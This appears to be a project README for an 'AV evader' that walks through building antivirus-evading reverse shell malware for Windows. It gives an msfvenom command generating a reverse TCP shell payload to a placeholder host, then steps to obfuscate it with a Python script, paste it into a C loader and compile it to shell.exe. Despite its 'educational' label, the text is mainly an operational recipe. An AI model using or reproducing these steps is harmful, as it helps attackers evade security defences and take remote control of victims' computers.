# Shellcode AV Evader
This project main only educational porpouses, the idea was based on
speechs of @Mr.Un1k0d3r and @mr.d0x

--- 

## Generate payload
`$ msfvenom -p windows/x64/shell/reverse_tcp LHOST=<YOUR_IP> LPORT=<PORT> -f c -o shellcode_c_payload.txt`

---

open file **dictionary_obfuscator.py** 

Execute `dictionary_obfuscator.py < example_shellcode.txt`

---
open file **reverse_shell.c**, paste the payload from python in the correct place, do the same for the size

---
compile with\
`$ x86_64-w64-mingw32-gcc -o shell.exe reverse_shell.c`


